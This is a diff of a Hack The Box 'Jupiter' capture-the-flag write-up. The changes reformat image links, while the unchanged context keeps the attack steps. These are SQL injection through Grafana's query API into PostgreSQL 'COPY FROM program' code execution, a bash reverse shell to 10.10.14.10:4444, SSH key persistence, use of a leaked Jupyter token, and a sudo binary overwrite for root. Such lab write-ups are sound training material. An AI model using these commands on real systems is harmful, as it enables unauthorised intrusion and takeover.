@@ -21,7 +21,7 @@ We have to add `jupiter.htb` to our `/etc/hosts` file to view port 80.
 
 The website was a typical corporate site:
 
-<figure><img src="../../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(706).png>)
 
 There was nothing inherently interesting about the website itself, so I ran a directory and subdomain scan on it. A `wfuzz` subdomain scan found this:
 
@@ -43,17 +43,16 @@ ID           Response   Lines    Word       Chars       Payload
 
 There's a `kiosk` endpoint. When visited, it shows a Grafana dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1123).png>)
 
 ### API SQL Injection
 
 When viewing the traffic in Burp, we can see a lot of requests sent to an `/api` endpoint:
 
-<figure><img src="../../../.gitbook/assets/image (2918).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2918).png>)
 
 I viewed the requests and found this `query` request:
 
-{% code overflow="wrap" %}
 ```http
 POST /api/ds/query HTTP/1.1
 Host: kiosk.jupiter.htb
@@ -76,11 +75,10 @@ Connection: close
 
 {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":935}],"range":{"from":"2023-06-07T20:30:32.533Z","to":"2023-06-08T02:30:32.534Z","raw":{"from":"now-6h","to":"now"}},"from":"1686169832533","to":"1686191432534"}
 ```
-{% endcode %}
 
 This query was sending a query to the backend database, and it look like it's vulnerable to SQL injection. We can attempt the PostGreSQL RCE exploit, which involves creating a table `cmd_exec`.
 
-<figure><img src="../../../.gitbook/assets/image (2128).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2128).png>)
 
 Now, we just need to execute a reverse shell with this query:
 
@@ -90,7 +88,7 @@ COPY cmd_exec FROM program 'bash -c \"bash -i >& /dev/tcp/10.10.14.10/4444 0>&1\
 
 Then, we would catch a reverse shell on a listener port:
 
-<figure><img src="../../../.gitbook/assets/image (3740).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3740).png>)
 
 ## Privilege Escalation
 
@@ -185,11 +183,11 @@ hosts:
 
 We can overwrite the existing file using `wget -O`. Afterwards, we can easily get a user shell:
 
-<figure><img src="../../../.gitbook/assets/image (2712).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2712).png>)
 
 We can drop our public key into the `authorized_keys` folder to upgrade our shell.
 
-<figure><img src="../../../.gitbook/assets/image (1505).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1505).png>)
 
 ### Jupyter -> Jovian Shell
 
@@ -214,7 +212,7 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 Port 8888 was a HTTP port, so let's do some `chisel` forwarding. When visited, it shows a Jupyter instance:
 
-<figure><img src="../../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(883).png>)
 
 There was some token required before we could visit the site. Normally, I'd access this through running `jupyter notebook list`, but there are Python errors with this method. So, we would have to find the source of this website instead to either fix the error or view the logs to find a token. A bit of enumeration reveals that the `/opt` directory contains some interesting files:
 
@@ -252,27 +250,27 @@ juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-06-08-18.log
 
 We can visit the site with the `?token` parameter at the end and be brought to a file directory:
 
-<figure><img src="../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(934).png>)
 
 When we click 'New', there's an option to create a new Notebook:
 
-<figure><img src="../../../.gitbook/assets/image (1959).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1959).png>)
 
 This brings us to what seems to be a Python interpreter:
 
-<figure><img src="../../../.gitbook/assets/image (2952).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2952).png>)
 
 I simply ran a command to generate another SUID binary on the machine.
 
-<figure><img src="../../../.gitbook/assets/image (1459).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1459).png>)
 
 This gives us an easy shell as the new user:
 
-<figure><img src="../../../.gitbook/assets/image (3647).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3647).png>)
 
 We can also get a reverse shell using this method by replacing the command run.
 
-<figure><img src="../../../.gitbook/assets/image (2037).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2037).png>)
 
 ### Sudo Privileges
 
@@ -300,6 +298,6 @@ ls -la /usr/local/bin/sattrack
 
 We can just overwrite this with `/bin/bash`, and then run it using `sudo` to get an easy root shell.
 
-<figure><img src="../../../.gitbook/assets/image (1784).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1784).png>)
 
 Rooted!
